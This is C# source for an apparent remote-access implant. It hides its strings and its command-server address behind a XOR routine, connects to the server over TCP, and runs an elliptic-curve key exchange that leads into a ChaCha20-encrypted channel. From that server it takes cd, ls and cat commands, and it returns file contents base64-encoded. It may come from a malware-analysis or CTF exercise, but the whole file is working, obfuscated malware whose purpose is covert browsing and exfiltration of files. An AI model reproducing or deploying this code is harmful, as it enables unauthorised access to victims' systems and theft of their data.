using System;
using System.Text;
using System.Security.Cryptography;
using System.Net.Sockets;

using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Math;
using Org.BouncyCastle.Math.EC;
using Org.BouncyCastle.Security;
using Org.BouncyCastle.Utilities;
using System.IO;


public class myEC
{
    public static FpCurve ellipticCurve;                            //  0    0
    public static Org.BouncyCastle.Math.EC.ECPoint ecPointGen;      //  1    8
    public static SecureRandom secureRandom;                        //  2    16
    public static TcpClient tcpClient;                              //  3    24
    public static NetworkStream networkStream;                      //  4    32
    public static IStreamCipher iStreamCipher;                      //  5    40

    static myEC()
    {
        //string strParamQ = "c90102faa48f18b5eac1f76bb40a1b9fb0d841712bbe3e5576a7a56976c2baeca47809765283aa078583e1e65172a3fd";
        string strEncParamQ = "463F43CDC15079D91C4AB352F862D545B097C05DC765794A4F5A8BC54828DE86E7D6B7E4657348A9EF3C89711A5F226502E0627B60079931BA7878B6BB4B22A384F20484811BE84E080C73C7E87B4707AD835B1F04236ADED81F4C565839C1C4";
        string strParamQ = DecodeEncryptData(strEncParamQ);
        BigInteger bigIntQ = new BigInteger(strParamQ, 16);

        //string strParamA = "a079db08ea2470350c182487b50f7707dd46a58a1d160ff79297dcc9bfad6cfc96a81c4a97564118a40331fe0fc1327f";
        string strEncParamA = "443644C595002F80181FB900FE6A8445E59592549366771F4F5B8BC24E7DD7D7E182E7EA307747F9EC3ADA22195C71670CE43A7B6551CC31EF287AE0EF4921A3DCF052848041EB1904097EC2BD2B4608F482531F5223698DDD4818550A3890C6";
        string strParamA = DecodeEncryptData(strEncParamA);
        BigInteger bigIntA = new BigInteger(strParamA, 16);

        //string strParamB = "9f939c02a7bd7fc263a4cce416f4c575f28d0c1315c4f0c282fca6709a5f9f7f9c251c9eede9eb1baa31602167fa5380";
        string strEncParamB = "1C604ACFC8012F8A1C49E950FE3CD442E3C5C258C2312A1C1C58DD901A7FD0D5E3D4EBB861214EABEC6B88204F0A74620DE4652F60049838B42F2EE2E04C70A6DCA501898041E61D585A2ECDEC784652F4D7501D57223DD9DB191D050C399F90";
        string strParamB = DecodeEncryptData(strEncParamB);
        BigInteger bigIntB = new BigInteger(strParamB, 16);

        //string strGenPointX = "087b5fe3ae6dcfb0e074b40f6208c8f6de4f4f0679d6933796d3b9bd659704fb85452f041fff14cf0e9aa7e45544f9d8";
        string strEncGenPointX = "153E449EC4047A8B1C1BBD50AA3CD540B0C69458C3667F4E1B5C8B9C1A7281D6E183E7BA65244FAEEA678F22100924670CE0677F630BCD6CBB7B22B3E91E21A2DDF307898344EF4C0C582D92B82E1456A5D35A4D00256ADCD81B4F505F33C398";
        string strGenPointX = DecodeEncryptData(strEncGenPointX);
        BigInteger bigIntGenPointX = new BigInteger(strGenPointX, 16);

        //string strGenPointY = "127425c1d330ed537663e87459eaa1b1b53edfe305f6a79b184b3180033aab190eb9aa003e02e9dbf6d593c5e3b08182";
        string strEncGenPointY = "143444C8C3577C89194DB804AC3E8243E2C0955FC46A781C1857DEC5187B85D1E7D3E0B935241AABED6B8D22480D2E3204EE372E32039738BD7D28E5B84876F9D5A35185D043EF480E5B7BC6EC231352F380071958216CDD881D1954013B9F92";
        string strGenPointY = DecodeEncryptData(strEncGenPointY);
        BigInteger bigIntGenPointY = new BigInteger(strGenPointY, 16);

        myEC.ellipticCurve = new FpCurve(bigIntQ, bigIntA, bigIntB);

        myEC.ecPointGen = ellipticCurve.CreatePoint(bigIntGenPointX, bigIntGenPointY);
        myEC.secureRandom = new SecureRandom();
    }

    public static void Run()
    {
        // string strIPPort = "192.168.56.103;31337";
        // string strEncIPPort = "143F41D2C05427964848A505F9698C43E4C5905B";
        // string strIPPort = "127.000.00.001;31337";
        string strEncIPPort = "143444D2C1522F964D4EA504F96B8C43E4C5905B";
        string strIPPort = myEC.DecodeEncryptData(strEncIPPort);

        // strSeparation = ";";
        string strEncSeparation = "1E";
        string strSeparation = myEC.DecodeEncryptData(strEncSeparation);

        string[] substrings = strIPPort.Split(strSeparation);

        string strIP = substrings[0];
        string strPort = substrings[1];
        int intPort = int.Parse(strPort);

        myEC.tcpClient = new TcpClient(strIP, intPort);
        myEC.networkStream = myEC.tcpClient.GetStream();

        myEC.KeyExchange();
        myEC.GetCommand();
    }

    public static string DecodeEncryptData(string inStr)
    {
        byte[] bArray = Convert.FromHexString(inStr);
        byte bKey = 0;
        int intIteration = 0;
        int intByteArrayLength = bArray.Length;

        if (intByteArrayLength > 0)
        {
            do
            {
                bKey = (byte)(13 * bKey + 0x25);
                bArray[intIteration] ^= bKey;
                intIteration++;
            }
            while (intByteArrayLength > intIteration);
        }
        return Encoding.UTF8.GetString(bArray);
    }

    public static BigInteger GeneratePrivateKey(int privateKeyBitLength)
    {
        BigInteger bigIntRandomPrivateKey;
        do
        {
            SecureRandom secureRandom = myEC.secureRandom;
            bigIntRandomPrivateKey = new BigInteger(privateKeyBitLength, secureRandom);
        }
        while (bigIntRandomPrivateKey.CompareTo(BigInteger.Zero) == 0);

        return bigIntRandomPrivateKey;
    }

    private static void KeyExchange()
    {
        // string strXorKey = "133713371337133713371337133713371337133713371337133713371337133713371337133713371337133713371337";
        string strEncXorKey = "143540CBC0512C8F4C4DB803F8698447E4C5905B90617C1F1C5D88934879D4D7B4D5E0EB60714CAFEC6DD8231809246704E5307B30019C3FBC7D28B3E81974F7D4F5008B8011EC4F0C0D78C3B8294407A485501B50213CDFDC1D485308399497";
        string strXorKey = DecodeEncryptData(strEncXorKey);
        BigInteger bigXorKey = new BigInteger(strXorKey, 16);

        if(myEC.ecPointGen == null || myEC.networkStream == null)
        {
            // string strNull = "null";
            string strEncNull = "4B731F90";
            string strNull = DecodeEncryptData(strEncNull);
            throw new InvalidOperationException(strNull);
        }

        BigInteger bigIntClientPrivateKey = GeneratePrivateKey(128);

        Org.BouncyCastle.Math.EC.ECPoint ecPointClientPublicKey = myEC.ecPointGen.Multiply(bigIntClientPrivateKey);
        Org.BouncyCastle.Math.EC.ECPoint ecPointClientPublicKeyNormolized = ecPointClientPublicKey.Normalize();

        if (ecPointClientPublicKeyNormolized.IsInfinity)
        {
            // string strNull = "inf";
            string strEncInf = "A4C6815";
            string strInf = DecodeEncryptData(strEncInf);
            throw new InvalidOperationException(strInf);
        }

        byte[] bArrayBuffer = new byte[48];

        BigInteger bigIntAffineClientX = ecPointClientPublicKeyNormolized.AffineXCoord.ToBigInteger();
        BigInteger bigIntAffineClientXXor = bigIntAffineClientX.Xor(bigXorKey);

        bigIntAffineClientXXor.ToByteArrayUnsigned(bArrayBuffer);
        myEC.networkStream.Write(bArrayBuffer);
#if DEBUG
        Console.WriteLine("bigIntClientXXor:\t" + bigIntAffineClientXXor.ToString(16).ToUpper());
        Console.WriteLine("bigIntClientX:\t\t" + bigIntAffineClientX.ToString(16).ToUpper());
#endif

        BigInteger bigIntAffineClientY = ecPointClientPublicKeyNormolized.AffineYCoord.ToBigInteger();

        BigInteger bigIntAffineClientYXor = bigIntAffineClientY.Xor(bigXorKey);

        bigIntAffineClientYXor.ToByteArrayUnsigned(bArrayBuffer);
        myEC.networkStream.Write(bArrayBuffer);
#if DEBUG
        Console.WriteLine("bigIntClientYXor:\t" + bigIntAffineClientYXor.ToString(16).ToUpper());
        Console.WriteLine("bigIntClientY:\t\t" + bigIntAffineClientY.ToString(16).ToUpper());
#endif
        myEC.networkStream.Read(bArrayBuffer);
        BigInteger bigIntServerXXor = new BigInteger(1, bArrayBuffer, 0, 48, true);
        BigInteger bigIntServerX = bigIntServerXXor.Xor(bigXorKey);

#if DEBUG
        Console.WriteLine("bigIntServerXXor:\t" + bigIntServerXXor.ToString(16).ToUpper());
        Console.WriteLine("bigIntServerX:\t\t" + bigIntServerX.ToString(16).ToUpper());
#endif

        myEC.networkStream.Read(bArrayBuffer);
        BigInteger bigIntServerYXor = new BigInteger(1, bArrayBuffer, 0, 48, true);
        BigInteger bigIntServerY = bigIntServerYXor.Xor(bigXorKey);

#if DEBUG
        Console.WriteLine("bigIntServerYXor:\t" + bigIntServerYXor.ToString(16).ToUpper());
        Console.WriteLine("bigIntServerY:\t\t" + bigIntServerY.ToString(16).ToUpper());
#endif

        Org.BouncyCastle.Math.EC.ECPoint ecPointServerPublic = myEC.ellipticCurve.CreatePoint(bigIntServerX, bigIntServerY);
        Org.BouncyCastle.Math.EC.ECPoint ecPointSharedSecret = ecPointServerPublic.Multiply(bigIntClientPrivateKey).Normalize();

        if (ecPointSharedSecret.IsInfinity)
        {
            // string strNull = "inf";
            string strEncNull = "A4C6815";
            string strNull = DecodeEncryptData(strEncNull);
            throw new InvalidOperationException(strNull);
        }

        BigInteger bigIntSharedAffinX = ecPointSharedSecret.AffineXCoord.ToBigInteger();

        bigIntSharedAffinX.ToByteArrayUnsigned(bArrayBuffer);

        byte[] bArrayHashSHA512 = SHA512.HashData(bArrayBuffer);

        unsafe
        {
            byte* vPtr;
            int intLength;

            if (bArrayHashSHA512 != null)
            {
                fixed (byte* innerPtr = &bArrayHashSHA512[0])
                {
                    vPtr = innerPtr;
                    
                }
                intLength = bArrayHashSHA512.Length;
            }
            else
            {
                vPtr = null;
                intLength = 0;
            }
            if (bArrayHashSHA512.Length < 40)
            {
                throw new BadImageFormatException();
            }

            myEC.iStreamCipher = new ChaChaEngine(20);

            byte[] bArrayKey = new byte[32];

            byte* src = vPtr;
            fixed (byte* dst = &bArrayKey[0])
            {
                // Copy the first 16 bytes (2 × 8 bytes)
                ((ulong*)dst)[0] = ((ulong*)src)[0]; // offset +16
                ((ulong*)dst)[1] = ((ulong*)src)[1]; // offset +24

                // Copy the next 16 bytes (offset +16 from the source)
                ((ulong*)dst)[2] = ((ulong*)src)[2]; // offset +32
                ((ulong*)dst)[3] = ((ulong*)src)[3]; // offset +40
            }

            // IV - the next 8 bytes from the SHA-512 hash
            byte[] bArrayIV = new byte[8];
            fixed (byte* dst = &bArrayIV[0])
            {
                ((ulong*)dst)[0] = ((ulong*)src)[4];
            }

            // Encryption parameters
            KeyParameter paramsKey = new KeyParameter(bArrayKey);
            ParametersWithIV paramsIv = new ParametersWithIV(paramsKey, bArrayIV);

            // Init(true, paramsIv) - Initialization for encryption
            myEC.iStreamCipher.Init(true, paramsIv);  

            string strReceived = myEC.ReceiveDecrypted();

            // string strVerify = "verify";
            string strEncVerify = "53630195971b";
            string strVerify = myEC.DecodeEncryptData(strEncVerify);

            if (!strReceived.Equals(strVerify))
            {
                // string strnVerifyFailed = "verify failed";
                string strnEncVerifyFailed = "53630195971b3fde1c17e751ad";
                string strnVerifyFailed = myEC.DecodeEncryptData(strnEncVerifyFailed);
                throw new InvalidOperationException(strnVerifyFailed);
            }
#if DEBUG
            else
            {
                Console.WriteLine("Right key exchange.");
            }
#endif
            SendAndEncrypt(strVerify);
        }
    }

    private static string ReceiveDecrypted()
    {
        byte symbol;

        if (myEC.iStreamCipher == null || myEC.networkStream == null)
        {
            // string strNull = "null";
            string strEncNull = "4B731F90";
            string strNull = DecodeEncryptData(strEncNull);
            throw new InvalidOperationException(strNull);
        }

        byte[] bArrayBuffer = new byte[1024];
        byte[] receivedByte = new byte[1];

        int readIterations = 0;

        while (true)
        {
            int length = myEC.ReadFromNetworkStream(myEC.networkStream, receivedByte, 1);
            symbol = myEC.iStreamCipher.ReturnByte(receivedByte[0]);
            if (symbol == 0)
            {
                break;
            }

            bArrayBuffer[readIterations++] = symbol;
            if (readIterations >= 1024)
            {
                // string strTooLong = "too long"
                string strEncTooLong = "51691cdc9d0d71df";
                string strTooLong = myEC.DecodeEncryptData(strEncTooLong);
                throw new InvalidOperationException(strTooLong);
            }
        }

#if DEBUG
        string strOut = Encoding.ASCII.GetString(bArrayBuffer, 0, readIterations);
        if (strOut != null && strOut.Length != 0)
        {
            Console.WriteLine("=====================================================================");
            Console.WriteLine("Received data:");
            Console.WriteLine(strOut);
        }
#endif
        return Encoding.ASCII.GetString(bArrayBuffer, 0, readIterations);
    }

    private static void SendAndEncrypt(string inStrForSend)
    {
        if (myEC.iStreamCipher == null || myEC.networkStream == null)
        {
            // string strNull = "null";
            string strEncNull = "4B731F90";
            string strNull = DecodeEncryptData(strEncNull);
            throw new InvalidOperationException(strNull);
        }

        byte[] bArray = new byte[inStrForSend.Length + 1];
        byte[] bArrayTemp = Encoding.UTF8.GetBytes(inStrForSend);
        byte[] bArrayEncSend = new byte[bArray.Length];

        uint uiIteration = 0;

        Array.Copy(bArrayTemp, bArray, bArrayTemp.Length);

        if (bArray.Length > 0)
        {
            while (bArray.Length > uiIteration)
            {
                bArrayEncSend[uiIteration] = myEC.iStreamCipher.ReturnByte(bArray[uiIteration]);
                uiIteration++;
            }
        }

        myEC.networkStream.Write(bArrayEncSend);

#if DEBUG
        if (inStrForSend != null && inStrForSend.Length != 0)
        {
            Console.WriteLine("=====================================================================");
            Console.WriteLine("Send data:");
            Console.WriteLine(inStrForSend);
        }
#endif
    }

    private static int ReadFromNetworkStream(NetworkStream inNetworkStream, byte[] buffer, int bytesToRead)
    {
        int totalBytesRead = 0;
        int receivedBytes = 0;

        if (bytesToRead <= 0)
        {
            return totalBytesRead;
        }
        while (true)
        {
            receivedBytes = inNetworkStream.Read(buffer);
            totalBytesRead += receivedBytes;

            if (receivedBytes == 0)
                break;

            if (totalBytesRead >= bytesToRead)
                return totalBytesRead;
        }

        return totalBytesRead;
    }

    private static void GetCommand()
    {
        string strReceived;
        string[] strArraySplit;
        int intSizeArraySplit;

        while (true)
        {
            while (true)
            {
                while (true)
                {
                    while (true)
                    {
                        strReceived = myEC.ReceiveDecrypted();

                        // string strnPipe = "|";
                        string strEncPipe = "59";
                        string strPipe = myEC.DecodeEncryptData(strEncPipe);

                        strArraySplit = strReceived.Split(strPipe);
                        intSizeArraySplit = strArraySplit.Length;
                        if (intSizeArraySplit == 0)
                        {
                            throw new BadImageFormatException();
                        }

                        // string strCD = "cd";
                        string strEncCD = "4662";
                        string strCD = myEC.DecodeEncryptData(strEncCD);
                        if (!strArraySplit[0].Equals(strCD))
                        {
                            break;
                        }

                        if (intSizeArraySplit <= 1)
                        {
                            throw new BadImageFormatException();
                        }

                        Directory.SetCurrentDirectory(strArraySplit[1]);

                        // string strOK = "ok";
                        string strEncOK = "4a6d";
                        string strOK = myEC.DecodeEncryptData(strEncOK);

                        SendAndEncrypt(strOK);
                    }

                    // string strLS = "ls";
                    string strEncLS = "4975";
                    string strLS = myEC.DecodeEncryptData(strEncLS);
                    if (!strArraySplit[0].Equals(strLS))
                    {
                        break;
                    }
                    StringBuilder sbDirsFiles = new StringBuilder();

                    // string strEncSeparatorDirs = "=== dirs ===";
                    string strEncHeaderDirs = "183b4edc950b6dcb5d43b609";
                    string strHeaderDirs = myEC.DecodeEncryptData(strEncHeaderDirs);
                    sbDirsFiles.Append(strHeaderDirs);
                    sbDirsFiles.Append(Environment.NewLine);

                    string currentDirectory = Directory.GetCurrentDirectory();

                    // string strEncSeparatorDirs = ".";
                    string strEncSymbolPoint = "0b";
                    string strSymbolPoint = myEC.DecodeEncryptData(strEncSymbolPoint);

                    string[] strArrayDirectories = Directory.GetDirectories(currentDirectory, strSymbolPoint);
                    int intAmountDirectories = strArrayDirectories.Length;
                    if (intAmountDirectories > 0)
                    {
                        for (int iter = 0; iter < intAmountDirectories; iter++)
                        {
                            sbDirsFiles.Append(strArrayDirectories[iter]);
                            sbDirsFiles.Append(Environment.NewLine);
                        }
                    }

                    // string strEncSeparatorDirs = "=== files ===";
                    string strEncHeaderFiles = "183b4edc970b73dd0e5eb609f4";
                    string strHeaderFiles = myEC.DecodeEncryptData(strEncHeaderFiles);
                    sbDirsFiles.Append(strHeaderFiles);
                    sbDirsFiles.Append(Environment.NewLine);

                    string[] strArrayFiles = Directory.GetFiles(currentDirectory, strSymbolPoint);
                    int intAmountFiles = strArrayFiles.Length;
                    if (intAmountFiles > 0)
                    {
                        for (int iter = 0; iter < intAmountFiles; iter++)
                        {
                            sbDirsFiles.Append(strArrayFiles[iter]);
                            sbDirsFiles.Append(Environment.NewLine);
                        }
                    }

                    string strOut = sbDirsFiles.ToString();
                    SendAndEncrypt(strOut);
                }

                // string strCat = "cat";
                string strEncCat = "466707";
                string strCat = myEC.DecodeEncryptData(strEncCat);
                if (!strArraySplit[0].Equals(strCat))
                {
                    break;
                }
                if (intSizeArraySplit <= 1)
                {
                    throw new BadImageFormatException();
                }

                byte[] byteAllFileBytes = System.IO.File.ReadAllBytes(strArraySplit[1]);
                string strBaseData = Convert.ToBase64String(byteAllFileBytes);
                SendAndEncrypt(strBaseData);
            }

            // string strExit = "exit";
            string strEncExit = "407e1a88";
            string strExit = myEC.DecodeEncryptData(strEncExit);
            if (strArraySplit[0].Equals(strExit))
            {
                return;
            }

            // string strBadCmd = "bad cmd";
            string strEncBadCmd = "476717dc920f7b";
            string strBadCmd = myEC.DecodeEncryptData(strEncBadCmd);
            SendAndEncrypt(strBadCmd);
        }
    }
}

internal class main_client
{
    static void Main(string[] args)
    {
        myEC.Run();
    }
}
